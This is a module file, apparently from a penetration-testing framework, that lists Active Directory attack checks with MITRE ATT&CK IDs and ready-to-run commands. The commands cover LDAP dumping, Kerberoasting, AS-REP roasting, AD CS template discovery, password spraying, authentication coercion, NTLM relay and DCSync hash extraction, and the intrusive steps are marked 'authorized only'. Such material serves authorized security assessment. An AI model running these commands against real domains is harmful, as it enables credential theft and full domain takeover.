# Active Directory Module

LDAP/Kerberos/AD methodology. Runs once per host that shows domain-controller
indicators (`condition: is_dc`). `{domain}` is a placeholder for the operator.

```yaml
module: active_directory
title: Active Directory
scope: host
condition: is_dc
summary: "Active Directory / domain-controller methodology."
finding_keywords: [ldap, kerberos, smb, ms17-010]
finding_categories: [Directory, "Vuln scan"]
attack_surface:
  - when: "always"
    note: "Host shows domain-controller indicators (Kerberos/LDAP services or DC naming)."
  - when: "always"
    note: "Domain context — credential exposure here can escalate to domain-wide access."
techniques_extra: [T1003.006]
checks:
  - {name: LDAP anonymous bind, attack: T1087.002, command: "ldapsearch -x -H ldap://{ip} -s base namingContexts",
     purpose: "Test anonymous bind; read base DSE / naming contexts."}
  - {name: Domain object dump, attack: T1087.002, command: "ldapdomaindump -u '{domain}\\<user>' -p <pass> {ip}",
     purpose: "Dump users/groups/computers/policies over LDAP (ldapdomaindump)."}
  - {name: Domain user enumeration, attack: T1087.002, command: "kerbrute userenum -d {domain} --dc {ip} users.txt",
     purpose: "Validate usernames via Kerberos pre-auth responses."}
  - {name: Password policy, attack: T1201, command: "nxc smb {ip} -u <user> -p <pass> --pass-pol   (or rpcclient -c getdompwinfo)",
     purpose: "Read lockout/complexity policy before any spraying."}
  - {name: AS-REP roasting, attack: T1558.004, command: "GetNPUsers.py {domain}/ -dc-ip {ip} -usersfile users.txt -no-pass -format hashcat",
     purpose: "Find accounts without Kerberos pre-auth (offline cracking)."}
  - {name: Kerberoasting, attack: T1558.003, command: "GetUserSPNs.py {domain}/<user>:<pass> -dc-ip {ip} -request -outputfile spn.hashes",
     purpose: "List/request SPN tickets for offline cracking."}
  - {name: AD CS templates (ESC), attack: T1649, command: "certipy find -u <user>@{domain} -p <pass> -dc-ip {ip} -vulnerable -stdout",
     purpose: "Find vulnerable certificate templates (ESC1-ESC16) via Certipy."}
  - {name: Delegation enumeration, attack: T1558, command: "findDelegation.py {domain}/<user>:<pass> -dc-ip {ip}",
     purpose: "Enumerate unconstrained/constrained/RBCD delegation."}
  - {name: BloodHound collection, attack: T1482, command: "bloodhound-python -d {domain} -u <user> -p <pass> -dc {label} -c All   (Windows: SharpHound -c All)",
     purpose: "Collect AD objects/ACLs/sessions to map privilege paths."}
  - {name: SOAPHound collection (ADWS), attack: T1482, command: "soaphound.py -u '{domain}\\<user>' -p <pass> --dc {ip} --bloodhound",
     purpose: "Collect BloodHound data over ADWS - stealthier than LDAP queries."}
  - {name: Password spraying, attack: T1110.003, risk: intrusive, command: "# authorized only, respect lockout: nxc smb {ip} -u users.txt -p 'Spring2026!' --continue-on-success",
     purpose: "Spray one password across users (lockout-aware)."}
  - {name: Coercion (forced auth), attack: T1187, risk: intrusive, command: "# authorized only: coercer coerce -u <user> -p <pass> -d {domain} -t {ip} -l <listener-ip>",
     purpose: "Coerce DC auth (PetitPotam/Coercer) toward a relay listener."}
  - {name: NTLM relay to LDAP/ADCS, attack: T1557.001, risk: intrusive, command: "# authorized only: ntlmrelayx.py -t ldaps://{ip} --escalate-user <user>  (ESC8: -t http://<ca>/certsrv)",
     purpose: "Relay coerced auth to LDAP(S)/AD CS for privilege escalation."}
  - {name: DCSync, attack: T1003.006, risk: intrusive, command: "# authorized only (needs replication rights): secretsdump.py {domain}/<user>:<pass>@{ip} -just-dc",
     purpose: "Replicate directory secrets (krbtgt / domain hashes)."}
```
